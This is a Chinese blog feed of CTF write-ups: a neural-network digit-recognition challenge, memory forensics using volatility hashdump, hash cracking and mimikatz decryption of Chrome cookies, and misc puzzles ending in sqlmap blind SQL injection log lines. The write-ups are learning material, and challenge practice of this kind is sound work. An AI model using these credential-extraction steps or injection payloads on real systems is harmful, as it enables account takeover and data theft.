<p><code>hgame{Y0u_Find_Pur3_Mem0ry}</code></p>
<h2 id="accuracy">accuracy</h2>
<p>新上的题，直接就没打。也幸亏没打，看了wp才知道是机器学习，学个屁</p>
<p>直接贴wp</p>
<p>⾸先有两个附件,⼀个 zip 包,⾥⾯装了⼀万多张图⽚,每张图⽚是⿊⽩图像,⻓宽 28×28 ,如果有接触过 MNIST （作为校内 Hint 放出过）的同学可能会发现,数字部分实际上很像,而字⺟部分也极为相似,另⼀ 个附件是⼀个 csv ⽂件,⾏数不是重点,⼀⾏代表⼀个记录,总共 785 列,实际上,不算上第⼀列的 label ,只 有 784 列, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>28</mn><mo>×</mo><mn>28</mn><mo>=</mo><mn>784</mn></mrow><annotation encoding="application/x-tex">28×28=784</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord">8</span><span class="mord">4</span></span></span></span> ,并且随机挑⼏列出来查看,数据最⼤不过 255 ,最小不低于 0 ,很可能是 28*28 的 图像数据的记录,这道题的做法⼗分简单,把压缩包⾥所有的图⽚的数字都识别出来,按顺序组成字符串,粘 贴到题⽬给的⽹址中提交即可。为了降低难度,实际上压缩包⾥的图⽚都是从 .csv ⽂件中提取出来的,只 不过为了防⽌暴⼒匹配,所有的⾮ 0 部分都被减了 1 ,官⽅解法为训练⼀个神经⽹络进⾏识别,由于提交时 有要求准确率要在 95% 以上,因此训练⼀个⼀般的模型即可, 以下给出数据分析及训练脚本</p>
<pre><code class="language-python">#%%
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import tensorflow as tf
import seaborn as sns
import os
from sklearn.preprocessing import MinMaxScaler
from sklearn.model_selection import train_test_split
sns.set()
gpus = tf.config.experimental.list_physical_devices(device_type='GPU')
for gpu in gpus:
    tf.config.experimental.set_memory_growth(gpu, True)
os.environ['CUDA_VISIBLE_DEVICES']='0'
#%%
dataset_path = &quot;full_Hex.csv&quot;
dataset = pd.read_csv(dataset_path).astype('float32')
#dataset.rename(columns={'0': 'label'}, inplace=True)
#%%
X = dataset.drop('label',axis = 1)
y = dataset['label']
#%%
print(&quot;shape:&quot;,X.shape)
print(&quot;culoms count:&quot;,len(X.iloc[1]))
print(&quot;784 = 28X28&quot;)
#%%
from sklearn.utils import shuffle
X_shuffle = shuffle(X)
#%%
plt.figure(figsize = (12,10))
row, colums = 4, 4
for i in range(16):
    plt.subplot(colums, row, i+1)
    plt.imshow(X_shuffle.iloc[i].values.reshape(28,28),interpolation='nearest',
cmap='Greys')
plt.show()
# %%
# Change label to alphabets
alphabets_mapper = {0:'0',1:'1',2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9',10:'A',11:'B',12:'C',13:'D',14:'E',15:'F'}
dataset_alphabets = dataset.copy()
dataset['label'] = dataset['label'].map(alphabets_mapper)
label_size = dataset.groupby('label').size()
label_size.plot.barh(figsize=(10,10))
plt.show()
# %%
X_train, X_test, y_train, y_test = train_test_split(X,y)
# scale data
standard_scaler = MinMaxScaler()
standard_scaler.fit(X_train)
X_train = standard_scaler.transform(X_train)
X_test = standard_scaler.transform(X_test)
# %% 然后利⽤训练出来的模型识别压缩包⾥的⽂件
print(&quot;Data after scaler&quot;)
X_shuffle = shuffle(X_train)
plt.figure(figsize = (12,10))
row, colums = 4, 4
for i in range(16):
    plt.subplot(colums, row, i+1)
    plt.imshow(X_shuffle[i].reshape(28,28),interpolation='nearest',
cmap='Greys')
plt.show()
# %%
X_train = X_train.reshape(X_train.shape[0], 28, 28, 1).astype('float32')
X_test = X_test.reshape(X_test.shape[0], 28, 28, 1).astype('float32')
y_train = tf.keras.utils.to_categorical(y_train)
y_test = tf.keras.utils.to_categorical(y_test)
# %%
from tensorflow.keras.layers import Conv2D,MaxPooling2D,Dropout,Flatten,Dense
cls = tf.keras.models.Sequential()
cls.add(Conv2D(32, (5, 5), input_shape=(28, 28, 1), activation='relu'))
cls.add(MaxPooling2D(pool_size=(2, 2)))
cls.add(Dropout(0.3))
cls.add(Flatten())
cls.add(Dense(128, activation='relu'))
cls.add(Dense(64, activation='relu'))
cls.add(Dense(len(y.unique()), activation='softmax'))
# %%
# start trainning
cls.compile(loss='categorical_crossentropy', optimizer='adam', metrics=
['accuracy'])
history = cls.fit(X_train, y_train, validation_data=(X_test, y_test), epochs=5,
batch_size=200, verbose=2)
scores = cls.evaluate(X_test,y_test, verbose=0)
print(&quot;CNN Score:&quot;,scores[1])
# %%
# 数据分析
plt.plot(history.history['loss'])
plt.plot(history.history['val_loss'])
plt.title('Model loss')
plt.ylabel('Loss')
plt.xlabel('Epoch')
plt.legend(['Train', 'Test'], loc='upper left')
plt.show()
# %%
# 结果保存
cls.save('my_Hex_full_model_2.h5')
# %%#%%
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import tensorflow as tf
import seaborn as sns
import os
from sklearn.preprocessing import MinMaxScaler
from sklearn.model_selection import train_test_split
sns.set()
gpus = tf.config.experimental.list_physical_devices(device_type='GPU')
for gpu in gpus:
    tf.config.experimental.set_memory_growth(gpu, True)
os.environ['CUDA_VISIBLE_DEVICES']='0'
#%%
dataset_path = &quot;full_Hex.csv&quot;
dataset = pd.read_csv(dataset_path).astype('float32')
#dataset.rename(columns={'0': 'label'}, inplace=True)
#%%
X = dataset.drop('label',axis = 1)
y = dataset['label']
#%%
print(&quot;shape:&quot;,X.shape)
print(&quot;culoms count:&quot;,len(X.iloc[1]))
print(&quot;784 = 28X28&quot;)
#%%
from sklearn.utils import shuffle
X_shuffle = shuffle(X)
#%%
plt.figure(figsize = (12,10))
row, colums = 4, 4
for i in range(16):
    plt.subplot(colums, row, i+1)
    plt.imshow(X_shuffle.iloc[i].values.reshape(28,28),interpolation='nearest',
cmap='Greys')
plt.show()
# %%
# Change label to alphabets
alphabets_mapper = {0:'0',1:'1',2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9',10:'A',11:'B',12:'C',13:'D',14:'E',15:'F'}
dataset_alphabets = dataset.copy()
dataset['label'] = dataset['label'].map(alphabets_mapper)
label_size = dataset.groupby('label').size()
label_size.plot.barh(figsize=(10,10))
plt.show()
# %%
X_train, X_test, y_train, y_test = train_test_split(X,y)
# scale data
standard_scaler = MinMaxScaler()
standard_scaler.fit(X_train)
X_train = standard_scaler.transform(X_train)
X_test = standard_scaler.transform(X_test)
# %% 然后利⽤训练出来的模型识别压缩包⾥的⽂件
print(&quot;Data after scaler&quot;)
X_shuffle = shuffle(X_train)
plt.figure(figsize = (12,10))
row, colums = 4, 4
for i in range(16):
    plt.subplot(colums, row, i+1)
    plt.imshow(X_shuffle[i].reshape(28,28),interpolation='nearest',
cmap='Greys')
plt.show()
# %%
X_train = X_train.reshape(X_train.shape[0], 28, 28, 1).astype('float32')
X_test = X_test.reshape(X_test.shape[0], 28, 28, 1).astype('float32')
y_train = tf.keras.utils.to_categorical(y_train)
y_test = tf.keras.utils.to_categorical(y_test)
# %%
from tensorflow.keras.layers import Conv2D,MaxPooling2D,Dropout,Flatten,Dense
cls = tf.keras.models.Sequential()
cls.add(Conv2D(32, (5, 5), input_shape=(28, 28, 1), activation='relu'))
cls.add(MaxPooling2D(pool_size=(2, 2)))
cls.add(Dropout(0.3))
cls.add(Flatten())
cls.add(Dense(128, activation='relu'))
cls.add(Dense(64, activation='relu'))
cls.add(Dense(len(y.unique()), activation='softmax'))
# %%
# start trainning
cls.compile(loss='categorical_crossentropy', optimizer='adam', metrics=
['accuracy'])
history = cls.fit(X_train, y_train, validation_data=(X_test, y_test), epochs=5,
batch_size=200, verbose=2)
scores = cls.evaluate(X_test,y_test, verbose=0)
print(&quot;CNN Score:&quot;,scores[1])
# %%
# 数据分析
plt.plot(history.history['loss'])
plt.plot(history.history['val_loss'])
plt.title('Model loss')
plt.ylabel('Loss')
plt.xlabel('Epoch')
plt.legend(['Train', 'Test'], loc='upper left')
plt.show()
# %%
# 结果保存
cls.save('my_Hex_full_model_2.h5')
# %%
</code></pre>
<p>然后利⽤训练出来的模型识别压缩包⾥的⽂件</p>
<pre><code class="language-python">import pandas as pd
import matplotlib.pyplot as plt
import numpy as np
import tensorflow as tf
import tensorflow.keras as keras
import os
alphabets_mapper =
{0:'0',1:'1',2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9',10:'a',11:'b',12:'
c',13:'d',14:'e',15:'f'}
gpus = tf.config.experimental.list_physical_devices(device_type='GPU')
for gpu in gpus:
	tf.config.experimental.set_memory_growth(gpu, True)
os.environ['CUDA_VISIBLE_DEVICES']='0'
model = tf.keras.models.load_model('./my_Hex_full_model_2.h5')
imgs = []
def pre(path:str):
	image_path = path
	image =
tf.keras.preprocessing.image.load_img(image_path,color_mode=&quot;grayscale&quot;)
	input_arr = keras.preprocessing.image.img_to_array(image)
	image_arr = 255-input_arr
	#plt.imshow(image_arr,interpolation='nearest', cmap='Greys')
	#input_arr = np.array([image_arr]) # Convert single image to a batch.
	imgs.append(image_arr)
	#predictions = model.predict(input_arr)
	#return predictions
total = 12272
ans = list()
for i in range(total):
	pre(f&quot;./png/{i}.png&quot;)
predictions = model.predict(np.array(imgs))
t = predictions.argmax(axis=1)
squarer = lambda t: alphabets_mapper[t]
vfunc = np.vectorize(squarer)
ans = vfunc(t)
with open(f&quot;result.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;) as e:
	print(''.join(ans.tolist()),file=e)
</code></pre>
<p>pytorch 的写法类似,这⾥不再放出, 此模型准确率⼤概在 98% 左右,没有经过精调</p>
<h1 id="week4">Week4</h1>
<h2 id="akira之瞳-1">Akira之瞳-1</h2>
<p>一看题目就知道是取证了，解压出一个<code>important_work.raw</code>文件</p>
<p>直接扔进volatility</p>
<pre><code class="language-shell">./volatility -f important_work.raw imageinfo
</code></pre>
<p>可以看到是win7的镜像</p>
<p>那么用pslist查看进程列表</p>
<pre><code class="language-shell">./volatility -f important_work.raw --profile=Win7SP1x64 pslist
</code></pre>
<p>可以看到一个<code>important_work</code>进程，pid是1092</p>
<p>那么dump下来</p>
<pre><code class="language-shell">./volatility -f important_work.raw --profile=Win7SP1x64 memdump -p 1092 -D ./
</code></pre>
<p>得到<code>1092.dmp</code>，直接foremost</p>
<p><code>output</code>文件夹下有个zip，备注<code>Password is sha256(login_password)</code></p>
<p>那么我们需要找到登陆密码并进行sha256加密，直接hashdump</p>
<pre><code class="language-shell">./volatility -f important_work.raw --profile=Win7SP1x64 hashdump
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Genga03:1001:aad3b435b51404eeaad3b435b51404ee:84b0d9c9f830238933e7131d60ac6436:::
</code></pre>
<p>首先把administrator的密码这一行扔进ophcrack，发现无密码，然后把Genga03账号这行扔进去发现解密失败了，做到这，还走了一些弯路，比如说用hivelist去查虚拟地址之类的再dump密码，其实没必要，最后直接去ophcrack的在线解密网站<code>https://www.objectif-securite.ch/ophcrack</code>，使用Genga03的NT-hash，也就是<code>84b0d9c9f830238933e7131d60ac6436</code>来解，解得密码:<code>asdqwe123</code>，再对其进行sha256加密，得到<code>20504cdfddaad0b590ca53c4861edd4f5f5cf9c348c38295bd2dbf0e91bca4c3</code></p>
<p>解压得两张图片，<code>Blind.png</code>和<code>src.png</code>，一看就知道是盲水印，脚本伺候</p>
<pre><code class="language-shell">python3 bwmforpy3.py decode src.png Blind.png flag.png 
</code></pre>
<p><code>hgame{7he_f1ame_brin9s_me_end1ess_9rief}</code></p>
<h2 id="akira之瞳-2">Akira之瞳-2</h2>
<p><code>secret_work.raw</code>和<code>secret.7z</code>，volatility伺候</p>
<pre><code class="language-shell">./volatility -f secret_work.raw imageinfo
</code></pre>
<p>还是Win7SP1x64系统</p>
<pre><code class="language-shell">./volatility -f secret_work.raw --profile=Win7SP1x64 pslist
</code></pre>
<p>看到一个<code>notepad.exe</code>和许多<code>chrome.exe</code>，iehistory看了下浏览器记录，发现打开了一哥<code>dumpme.txt</code></p>
<p>filescan后dumpfiles</p>
<pre><code class="language-shell">./volatility -f secret_work.raw --profile=Win7SP1x64 filescan | grep dumpme.txt
Volatility Foundation Volatility Framework 2.6
0x000000007ef94820      2      0 RW-r-- \Device\HarddiskVolume1\Users\Genga03\Desktop\dumpme.txt
0x000000007f2b5f20      2      0 RW-rw- \Device\HarddiskVolume1\Users\Genga03\AppData\Roaming\Microsoft\Windows\Recent\dumpme.txt.lnk
</code></pre>
<p>带lnk那个是个快捷方式，不用管，地址是<code>0x000000007ef94820</code></p>
<pre><code class="language-shell">./volatility -f secret_work.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007ef94820 -D ./
</code></pre>
<p>得到<code>file.None.0xfffffa801aa35340.dat</code></p>
<p>丢进winhex发现</p>
<p><code>zip password is: 5trqES&amp;P43#y&amp;1TO</code></p>
<p><code>And you may need LastPass</code></p>
<p>解压得到一个空文件夹<code>S-1-5-21-262715442-3761430816-2198621988-1001</code>，一个<code>container</code>和一个<code>Cookies</code>，不知道有啥用，结合hint看需要lastpass，安装之后不会用，搜了一下怎么从cookies读取某个密码没啥结果，<code>Cookies</code>丢进winhex可以看到是SQLite文件，用SQLite查看器看不到什么东西。再往下翻有VeraCrypt的字眼，那应该是<code>container</code>就是VeraCrypt加密过的文件，key就通过lastpass和cookies得到。就卡在这了，等待wp。</p>
<p>看了官方wp之后才知道用的是volatility的lastpass插件，结合关键词其实应该用&quot;lasspass 内存取证&quot;这种组合来搜，一下子就能得到相关文章，进而应该能很顺利的解出这道题。真是太可惜了。不过还是学习了mimikatz的使用，毕竟之前没接触过。</p>
<p>使用<code>mimikatz</code>解密cookies，要找到登陆密码，用volatility的lastpass插件(这个插件我装它和库前前后后磨蹭了两个小时，为了使用插件把之前的纯净可执行volatility改成py文件模式了)</p>
<pre><code class="language-shell">vol.py -f secret_work.raw --profile=Win7SP1x64 lastpass
Searching for LastPass Signatures
Found pattern in Process: chrome.exe (3948)
Found pattern in Process: chrome.exe (3948)
Found pattern in Process: chrome.exe (3948)
Found pattern in Process: chrome.exe (3948)
Found pattern in Process: chrome.exe (2916)
Found pattern in Process: chrome.exe (2916)
Found pattern in Process: chrome.exe (2916)
Found pattern in Process: chrome.exe (2916)
Found pattern in Process: chrome.exe (2916)
Found pattern in Process: chrome.exe (1160)
Found pattern in Process: chrome.exe (1160)
Found pattern in Process: chrome.exe (1160)
Found pattern in Process: chrome.exe (1160)

Found LastPass Entry for live.com
UserName: windows login &amp; miscrosoft
Pasword: Unknown

Found LastPass Entry for live.com,bing.com,hotmail.com,live.com,microsoft.com,msn.com,windows.com,windowsazure.com,office.com,skype.com,azure.com
UserName: windows login &amp; miscrosoft
Pasword: vIg*q3x6GFa5aFBA


Found Private Key
LastPassPrivateKey&lt;308204BB020100300D06092A864886F70D0101010500048204A5308204A10201000282010100BF794F57D296731F67FD1007BEB13A7732DE75CEB688A0A0B8A4C9DE5D0757E83F9CE8EED14346977C72C65F2C2834F150D9FB54086531896CDEFD6D8F4A5CCA2D39E0ADCB24AA6EE075579E9C6631588E9474F6B91B9D1D4D23E55442FA4E89D6810A764CCCEB224DB045DE8E9B17D3A0E561F96D4F414E775A76EA74031AB0EDAB640D1D5FFB8B83F7F7F0CA2D415F9E68CB9DB1AB6028012724AE5674FCC5C0C6085FD2A5C39E785E36C899166120893095779104A123090681914834E063FD433E0F54A221BFA6B344F76B270D1FB5FBC5A7385911A0222A65FD7FDA3573F1A9C8C8B75003664DC998FB6BAB048D65F0A44A23E1446E299A4323280A13ED020111028201000B435F052A815210E7FFD3C43864C734302B341B37E9EB54BF91390D1487F61CB872A44A488B7C9F7FCA8423B74DA8C2E6A369230F8D7B626FD0E1BB268BE7572FD63A64937AA09D1C43234590BAB79BCC26D9B429019FD48C112B9B8B7822BCD061F18E7CFCFEC5C855A9C1CC273DA30976E7A542AA4F22BBBA06FEBB87B6468A44BD7E57DA570AB63E1A013AD75AC3B6B3927D274769E4774B7DC66DC10CA337465A39221C062B9B96BF4E8BF484C3F171A40E41B6D32FC417E0A54EFEE8896346947F7CB40B382F2D8AB78D6CD040570FAC76C0497CC3A677B884B6208157E482D42B0CD675C7F52F50AAA221C076F2604475B4A3F766B9B0103DA11633ED02818100FE8270E2DD0E11837ECDE3E61EED958F59F0FC906A46082A9C38ED503968174F233CC4A7E95F1DF125CEDAAF56A374B986883CFD803FCE883378DCBB43EBDBB631E6069D3151572368206134BB850E3B47638C8E5CB4F4A742D30D87876BB76ACEEA9A0EEB6BB5301A5E730C976F660693BA37E9A73F66140F3EE3E6058687B702818100C0985DC66AD22251EB0A59F5C2F2A4D1228B14BDABA74FD178EADD30D33B0E9FF1DD45ECA56A3CC7FD8CA7E1F7361B63FA1C7387B3A0CC6ECFF7B9DBC55B938E33AD5AFADB5C0BE11C8CAD924B682A9EA68DC53616C2D3FAD16417A5E045E732F60F17DDF1A67BEEEB46CA9A0FFDD6A0B9D1E08F7DBE7087C5AA4B25700A197B0281801DF13A750AF298A60EEB0BC0B8582FB6830D4AE3D044796E6CBB67369D578A458BACCBD784DE0385C8367414A0C7EF9D5B1F163BF0F872A69CA4CEAC9E9437F7512A1EE55118A0D6FD30FC608E881FCABD1AC53DECC9FEAA4418D46A4C2ACA48CD0C8A9857EE8DC96C8395108A49574C116133C122BC2A207A43A2574BF1B59D0281805AA20E03051797AE14411B4679DB98DAE31445FEE75DCB3566142BDABDC1704B44A45D24119B67E5A47E6D1F0AEC491FFD3A90B85487E7BBAD2948676BEEDC06AEE82AD0673A5FF176D8CA26BA12E6E13F51C637923D90EE80A792A8698A4EAE91E8FC2C357B859D9BE5140C43C2BF5AB1CC2D70B3A4E9A94DF5C9028F13CFC102818100AAFE94334DE0035FE8673623497290B5D059E6176FB785D83A2EA157C2E3B335E2E264DC5D7EBB73E0348E7578D956F1AF59E81D9FC24FFB23A61B262184A0B06B4A0F79A750E0EFE776646CFF6ACDB2A2A4CFFBDEC64DA06F05A76A8028CC3E0D487A21C4EADA734DADEDC8280528892E07FBC98DC47B0E2ED1E69EDA479D05&gt;LastPassPrivateKey
</code></pre>
<p>下面的一大串<code>private key</code>不用管它，注意的是<code>Pasword: vIg*q3x6GFa5aFBA</code></p>
<p>这个是用<code>mimikatz</code>解密<code>cookies</code>的密码，在kali里把mimikatz拿到windows下运行</p>
<figure data-type="image" tabindex="5"><img src="http://ayanagi.fun/post-images/1614605400298.png" alt="" loading="lazy"></figure>
<p>然后用masterkey解密cookies</p>
<pre><code class="language-powershell">mimikatz # dpapi::chrome /in:&quot;Cookies&quot;
</code></pre>
<figure data-type="image" tabindex="6"><img src="http://ayanagi.fun/post-images/1614603806937.png" alt="" loading="lazy"></figure>
<p>这样就得到了VeraCrpyt的密码，解开<code>container</code>得到<code>ADS.jpg</code>，用<code>NtfsStreamsEditor</code>扫出<code>flag.txt</code><br>
<img src="http://ayanagi.fun/post-images/1614603814149.png" alt="" loading="lazy"><br>
<code>hgame{Which_0nly_cryin9_3yes_c4n_de5cribe}</code></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[特效轴入门]]></title>
        <id>http://ayanagi.fun/ROASTMEAT/</id>
        <link href="http://ayanagi.fun/ROASTMEAT/">
        </link>
        <updated>2021-02-24T12:26:47.000Z</updated>
        <content type="html"><![CDATA[<h1 id="aegisub文件结构">aegisub文件结构</h1>
<p>进入到aeg的目录，关注的是<code>automation</code>、<code>catalog</code>、<code>locale</code>和<code>csri</code>文件夹，<code>config.json</code>、<code>hotkey.json</code><br>
<strong>automation</strong> : 文件夹下存放一些关于自动化的插件(<code>autoload</code>下)，一些函数库(<code>include</code>下)<br>
<strong>csri</strong> : 存放字幕滤镜，例如<code>vsfiltermod</code><br>
<strong>config.json</strong>: 基础设置<br>
<strong>hotkey.json</strong> : 热键设置文件<br>
<strong>catalog</strong> : 样式库，存放以.sty结尾的字幕样式文件<br>
字幕的样式以一条这样的语句构成</p>
<pre><code>Style: Default,Arial,20,&amp;H00FFFFFFF,&amp;H00FFFFFF,&amp;H000000FF,&amp;H00000000,&amp;H00000000,0,0,0,0,100,100,0,0,1,2,2,2,10,10,10,1
</code></pre>
<p>一些字体字号等不赘述。其中，带<code>&amp;H</code>的是颜色标签，由两部分组成 : 1字节的透明标签和3字节的颜色代码，H代表的是16进制的表头，表示后面的数据是16进制，颜色顺序是B G R。<br>
颜色标签之后的参数代表的是边距、边框、杂项等内容，在样式编辑器里有对应。</p>
<p><strong>locale</strong> ： 语言库</p>
<h1 id="打k插件">打k插件</h1>
<p>自行安装，后面会用到<br>
https://blog.csdn.net/Seekladoom/article/details/104235193</p>
<h1 id="karaoke">Karaoke</h1>
<p><strong>作用</strong> ： 划分音节和时间<br>
<strong>规范</strong> ： 标识符 | 标点<code>{\k1}</code><br>
<strong>k标签</strong> ：<code>{\k$}</code><br>
<code>{}</code> : aeg标记<code>{}</code>内的内容为特效区，<code>$</code> : 时间划分 单位是1<strong>cs</strong> = 10ms;<br>
<code>ko</code> : 与k类似，但取消了字幕的边框<br>
<strong>特殊音节</strong>  : <code>|</code> : 注音</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BMZCTF misc 随手部分wp]]></title>
        <id>http://ayanagi.fun/BMZCTF/</id>
        <link href="http://ayanagi.fun/BMZCTF/">
        </link>
        <updated>2021-02-23T04:34:55.000Z</updated>
        <content type="html"><![CDATA[<p>刷的时候随手就写了，但是刷着刷着又懒得写了。于是就这样吧</p>
<h1 id="2018-hackergame-word-文档">2018 hackergame Word 文档</h1>
<p>直接把文档binwalk了，直接看到<code>flag.txt</code></p>
<h1 id="memory">memory</h1>
<p>内存镜像文件，题目的描述是：分析内存镜像,破解管理员的登录密码,flag为明文密码的MD5值</p>
<p>使用volatility</p>
<pre><code class="language-shell">volatility -f memory imageinfo
</code></pre>
<p>先查看镜像的大概信息，发现<code>suggested profile</code>是<code>WinXPSP2x86,WinXPSP3x86 (Instantiated with WinXPSP2x86)</code>使用hashdump命令把内存中所有用户的hash全部dump出来</p>
<pre><code class="language-shell">volatility -f memory --profile=WinXPSP2x86 hashdump
</code></pre>
<p>得到三行类似于shadow一样的密码串，都复制下来保存成1.txt，使用john爆破</p>
<pre><code class="language-shell">john --wordlist=/usr/share/john/password.lst --rules --format=NT 1.txt
</code></pre>
<p><code>--wordlist</code>是字典模式，<code>--rules</code> 是稍微变化的规则，其实不填也行，默认就是。<code>--format</code>是预定义密码破解的类型，有很多，可以通过<code>john --list=formats</code>查看，这里使用了NT类型</p>
<p>得到administrator的密码是<code>123456789</code>，md5加密包上flag{}</p>
<h1 id="misc_snake">misc_snake</h1>
<p>附件的解压密码使用ook解密</p>
<p>解压后3个文件：<code>process</code>、<code>data</code>、<code>data.jpg</code></p>
<p>全丢进winhex查看，process是明文的python代码，后缀改成py打开就能发现加密的原理</p>
<p>对照着写一个解密脚本</p>
<pre><code class="language-python">with open ('snake.jpg','wb') as flag:
    with open('data.jpg','rb') as f:
        for i in f.read():
            if (i % 2 == 0):
                i = (i+1) ^ 128
            else:
                i = (i-1) ^128
            i = bytes([i])
            flag.write(i)
</code></pre>
<p>得到snake.jpg，使用stegsolve切滤镜可以看到加密方式是serpent，google一个serpent在线解密发现需要密钥，密钥应该就从图片里找，steghide查看到有隐写一个key.txt，</p>
<pre><code class="language-shell">steghide extract -sf snake.jpg
</code></pre>
<p>得到key:<code>VivaLaVida</code>，去http://serpent.online-domain-tools.com/解密，下载解密后的文件，内容是只有w和b组成的文本，能想到w是white，b是black，批量替换，w为1，b为0，而且有40000个字符，那就是200*200的正方形，编写脚本绘制图片</p>
<pre><code class="language-python">from PIL import Image
with open (&quot;1.txt&quot;,'r') as d:
	flag = Image.new('L',(200,200))
	plain = d.read()
	i = 0
	for x in range(200):
		for y in range(200):
			if (plain[i] == '0'):
				flag.putpixel([x,y],0)
			else:
				flag.putpixel([x,y],255)
			i += 1
	flag.show()
</code></pre>
<p>得到一个二维码，扫码得flag</p>
<h1 id="misc_tiga">MISC_tiga</h1>
<p>解压，一个加密的压缩包和一段文本，应该是零宽，但是原来的零宽网站解出来的text是乱码，找了个好点的零宽解密站点https://yuanfux.github.io/zero-width-web/</p>
<p>得到解压密码，解出第二个压缩包和一张图片，压缩包里有一个加密的压缩包和一个装着好些password.txt的文件夹，CRC32爆破，抄来的脚本</p>
<pre><code class="language-python">import binascii
import string
def crack_crc():
    print('-------------Start Crack CRC-------------')
    crc_list = [0x14433530, 0xaf251007, 0xd554e7b6, 0xebb3156, 0xbb474d49, 0x2cb8a39b, 0x75fe76f0]
    comment = ''
    chars = string.printable
    for crc_value in crc_list:
        for char1 in chars:
            for char2 in chars:
                for char3 in chars:
                    res_char = char1 + char2 + char3
                    char_crc = binascii.crc32(res_char.encode())
                    calc_crc = char_crc &amp; 0xffffffff
                    if calc_crc == crc_value:
                        print('[+] {}: {}'.format(hex(crc_value),res_char))
                        comment += res_char
    print('-----------CRC Crack Completed-----------')
    print('Result: {}'.format(comment))
if __name__ == '__main__':
    crack_crc()
</code></pre>
<p>密码<code>T&amp;hg%WL0^rm@c!VK$xEt~</code>，图片丢winhex在尾巴看到hint:加密压缩包的密码是10位数字，使用掩码爆破，<code>2001701725</code></p>
<p>得到<code>youcanalso.jpg</code>和<code>flag.zip</code>，压缩包里有<code>youcanalso.jpg</code>，那么就是明文攻击了，把<code>youcanalso.jpg</code>添加成压缩包，CRC32值和压缩包里的相同，开始攻击，这里要注意一下，winrar压缩是无法明文攻击的，需要使用bandzip来压缩才可以。</p>
<p>出来密码<code>1amT1G@</code>，得到<code>flag.txt</code>内容是504B开头的串，粘贴进010editor保存为zip，一看是word类型的文件，改后缀为docx，打开发现好几页base加密，估计是全家桶，使用basecrack的m模式全解出来</p>
<pre><code class="language-shell">python basecrack.py --magic
</code></pre>
<p>然后粘贴word的内容</p>
<p><code>flag{8fa3e8c4-0121-4f2a-a7f0-0a60032e3763}</code></p>
<h1 id="pcap">pcap</h1>
<p>题目要求分析dno3.0协议的流量，wireshark打开，先筛出来，查看</p>
<p><code>Distributed Network Protocol 3.0&gt; Application Layer&gt;RESPONSE Data OBjects&gt; Object(s): 32-Bit Counter Change Event...&gt; Point Number 0(Quality: Online), Count:102....&gt;Counter(32 bit):102</code></p>
<p>这个102转换成字符 就是f，对应的数据包长度是91，按照数据包长度排序，按顺序查看每个数据包能找到对应位置有相应的字符，一个个找f、l、a、g....拼起来就得到了flag。</p>
<h1 id="pcap_analysis">pcap_analysis</h1>
<p>要求分析modbus流量，筛选之后右键追踪流，竖着读flag拼起来就行</p>
<h1 id="sdnisc2020_简单数据包">SDNISC2020_简单数据包</h1>
<p>一个pcapng文件，wireshark打不开，直接binwalk得到一个zip和一个txt，txt内容解b64得flag(binwalk对付流量包老非预期了)</p>
<h1 id="多啦a梦">多啦A梦</h1>
<p>解压得到<code>多啦A梦.jpg</code>和<code>提示.txt</code>，提示：图片是不是少了点什么？</p>
<p>直接foremost得到一个二维码png，改宽高扫码解b64得flag</p>
<h1 id="海量的txt文件">海量的txt文件</h1>
<p>几百个txt文件，打开都是没意义的串，放在一个文件夹里，扔kali</p>
<pre><code class="language-shell">strings * | grep flag
</code></pre>
<p>发现没东西，修改关键词，改成password、pass、key之类的，试到key后找到</p>
<p><code>key{fe9ff627da72364a}</code></p>
<h1 id="技协杯-我的密码呢对付高版本加密">技协杯-我的密码呢(对付高版本加密)</h1>
<p>如果在archpr里压缩包版本不支持，在010editor中把版本改成0就行了</p>
<h1 id="句末大佬的lsb">句末大佬的LSB</h1>
<p>一张png，复现的时候题目没描述，应该是用cloacked-pixel的lsb脚本，但是没出来。查wp 密码需要社工到句末师傅的姓氏，chen</p>
<pre><code class="language-shell">python lsb.py extract jumo.png flag.txt chen
</code></pre>
<p><code>HEBTUCTF{wuinoknadsflmladflnef}</code></p>
<h1 id="日志审计">日志审计</h1>
<p>下载附件logcheck.log打开找到盲注的记录如下</p>
<pre><code>192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C1%2C1%29%29%3D102--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
192.168.0.1 - - [13/Oct/2018:12:38:14 +0000] &quot;GET /flag.php?user=hence%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28secret%20AS%20CHAR%29%2C0x20%29%20FROM%20haozi.secrets%20ORDER%20BY%20secret%20LIMIT%200%2C1%29%2C2%2C1%29%29%3D108--%20pZaF HTTP/1.1&quot; 200 327 &quot;-&quot; &quot;sqlmap/1.2#pip (http://sqlmap.org)&quot;
